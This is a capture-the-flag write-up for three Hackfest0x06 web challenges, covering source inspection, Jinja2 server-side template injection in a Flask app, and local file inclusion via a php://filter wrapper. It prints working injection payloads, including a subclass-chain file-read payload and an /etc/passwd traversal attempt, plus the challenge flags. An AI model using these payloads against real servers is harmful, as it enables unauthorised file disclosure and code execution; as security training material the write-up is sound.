Web Exploitation
==
Table of Content:

* [baby_inspect](#baby_inspect)
* [Bayi Template](#Bayi-Template)
* [Bayi LeFI](#Bayi-LeFI)

## baby_inspect
![image](https://hackmd.io/_uploads/H1JXmS4iA.png)
The description told us that it may relate to some _inspect element_

![image](https://hackmd.io/_uploads/rkV4QB4iR.png)
The Website is like this, lets inspect the whole source code

![image](https://hackmd.io/_uploads/r1BB7rEjC.png)
in the div tag with class "**game-info**", there is a comment that gave a first bit of the flag, which is:

:::info 
(1/3) : **Hackfest0x06{c4N\_y0u\_**
:::

![image](https://hackmd.io/_uploads/BkuF7BVoC.png)
On Style Editor with **index.css**, look up on the lowermost of the program and I got the second bit flag.

:::info 
Flag (2/3) : **jUsT\_1nSp3ct\_**
:::

![image](https://hackmd.io/_uploads/SJ9TprNoA.png)
I look up on the **Debugger** tab, in the path **static->js** there were a javascript named **afaantuh.js** and I found the last bit of the flag.

:::info 
Flag (3/3) : **m3\_aNd\_f1nd\_M3}** 
:::

So, the whole flag is:

:::success
Flag = **Hackfest0x06{c4N\_y0u\_ jUsT\_1nSp3ct\_ m3\_aNd\_f1nd\_M3}**
:::


***

## Bayi Template
![image](https://hackmd.io/_uploads/ryGYm84j0.png)
In the description, it told that it just a simple calculator web app. So I open the link.

![image](https://hackmd.io/_uploads/SkB9X84iR.png)
The web app is look like this.

![image](https://hackmd.io/_uploads/BJE2m8EjA.png)
Next I try to look up from **inspect element** and search for header request. On the **Header Response,** I found interesting information which is **Server**. The server is use _**Werkzeug/2.2.2 Python/3.8.10.**_ Lets note this first.

![image](https://hackmd.io/_uploads/SJRp7L4o0.png)
* **Server: Werkzeug/2.2.2 Python/3.8.10**&#x20;
The server don't contain cookies, so the only information is about the server.

![image](https://hackmd.io/_uploads/SyYZ4L4jC.png)
I look up on the internet about **Werkzeug** and it related to **SSTI (Server Side Template Injection)**. I tried this website to looking for payload :

url: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

url: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

![image](https://hackmd.io/_uploads/rJXBVUViA.png)
I found something interesting on the **Werkzeug** which is **Flask**, so I look into it and found another website:

url: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

**SSTI (Server Side Template Injection)** can be found through website that use **Werkzeug** server which is **Flask** that used **Python** programming language. The simple payload to test is:

```python
{{7*7}}
```
![image](https://hackmd.io/_uploads/SyouEL4sR.png)
![image](https://hackmd.io/_uploads/S1Cu4UVsC.png)
The payload work out and it reflect the value. So we can use this template **\{{ \}}** to exploit through the system.

![image](https://hackmd.io/_uploads/H1Wc4LVjR.png)
Next, use this payload and it reflect the value:

```python
{{config}}
```

Now, we gained some information:

* **Server: Werkzeug/2.2.2 Python/3.8.10**&#x20;
* **Use Jinja2 since \{{7\*7\}} work out**

![image](https://hackmd.io/_uploads/rJujEU4j0.png)
I looked up through internet and found some website that gave some payloads references:

url: https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

![image](https://hackmd.io/_uploads/BkXp48ViC.png)
I use burpsuite and with this payload:


```python
{{‘tes’.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0](‘flag.txt’).read()}} 
```

I finally spilled the flag, which is:


:::success
**Hackfest0x06{1\_l0v3\_Flask\_but\_1\_hate\_sn4ke\_\_it5\_call3d\_SSTI\_btw\_cheers}**
:::

<details>

<summary>Payload Explanation</summary>

**`{{‘tes’}}`** : gave output '**tes'** and the data type is **string(str).**

**`{{‘tes'.__class__}}`** : access **\_\_class\_\_** of **str.**

**`{{‘tes’.__class__.__base__}}`** : access **\_\_base\_\_** to know that class **object** available.

**`{{‘tes’.__class__.__base__.__subclasses__()}}` :** access **\_\_subclassess\_\_()** to list available subclasses for **object**.

**`{{‘tes’.__class__.__base__.__subclasses__()[92]}}` :** find class named **\_io.\_IOBase** to access Input/Output. It may vary but I found on it on index **92** (the output will reflect whether our class is exact match or not).

**`{{‘tes’.__class__.__base__.__subclasses__()[92].__subclasses__()[0]}}` :**  find class named **\_io.\_RawIOBase.**&#x20;

&#x20;**`{{‘tes’.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]}}` :** find class named **\_io.\_FileIO.** This used to access file using I/O.

**`{{‘tes’.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('flag.txt').read()}}`** : use this class to grab object and read it and displayed it to the screen. use **('flag.txt').read()** to get and read file named **flag.txt** and show it to screen.&#x20;



</details>

***

## Bayi LeFI

![image](https://hackmd.io/_uploads/rJDavIVoA.png)
Based on the title, it indicate about **LFI** (Local File Inclusion). LFI is an attack technique in which attackers trick a web app into either running or exposing files on a web server [\[1\]](web-exploitation.md#1-https-brightsec.com-blog-local-file-inclusion-lfi-text-local-20file-20inclusion-20is-20an-xss-20an). With LFI, it can escalate to many ways such as expose sensitive information, XSS, and remote code execution.&#x20;

#### \[1]: [https://brightsec.com/blog/local-file-inclusion-lfi/#:\~:text=Local%20File%20Inclusion%20is%20an,XSS)%20and%20remote%20code%20execution.](https://brightsec.com/blog/local-file-inclusion-lfi/)

![image](https://hackmd.io/_uploads/SJcCv8EsA.png)
The webpage just show us something like this and tell us about LFI. There's 2 active link which one is:

![image](https://hackmd.io/_uploads/BkygdUVoC.png)
If I click one of it, It will gave query string with param name **gaskuen** and the value is **hola**. It will also reflected on the webpage as you can see in the middle.&#x20;

![image](https://hackmd.io/_uploads/rJoxuLVjC.png)
If I tried another link on the homepage, it will also gave query string with param name **gaskeun** and value **halo**. But, the value didn't reflect on the webpage. Something interesting part about the first link, so I open up again the first link to try enumerate on them.

![image](https://hackmd.io/_uploads/HkdWu84iR.png)
On the first link, I tried this payload `.../...//etc//passwd` to try bypass the blacklist, but nothing happened.&#x20;

![image](https://hackmd.io/_uploads/Sk0YYIEsC.png)
After a while tried to searching about LFI, I found this interesting article which says that may be it will work if I try **PHP Wrapper** that one of it have **PHP filter**.&#x20;

```html
php://filter
```

The concept is put a local file then encode with base64. To begin with it, here the payload:

```html
php://filter/convert.base64-encode/resource=hola
```

**hola** is the param value, I tried to send the request and the web reflect the base64 encode which is:

**encoded text:** SG9sYQ==

**decoded text:** Hola

With this, we know that the param value will reflect on the web page as an encoded text.&#x20;

Here the source about LFI and PHP Wrapper:

url:https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601

![image](https://hackmd.io/_uploads/SJ1ejINj0.png)
I tried to change the param value with **flag** and it gave another base64 encoded.

Payload:

```htmlembedded
?gaskeun=php://filter/convert.base64-encode/resource=flag`
```

**encoded text:** PD9waHAKCiRmbGFnID0gIkhhY2tmZXN0MHgwNntWdWxOM3JyX1czYl9TNGxhaF9zNFR1X055NF9ZNDRfTGZpfSI7

**decoded text:**

```php
<?php

$flag = "Hackfest0x06{VulN3rr_W3b_S4lah_s4Tu_Ny4_Y44_Lfi}";

```

:::success
**Hackfest0x06{VulN3rr\_W3b\_S4lah\_s4Tu\_Ny4\_Y44\_Lfi}**
:::
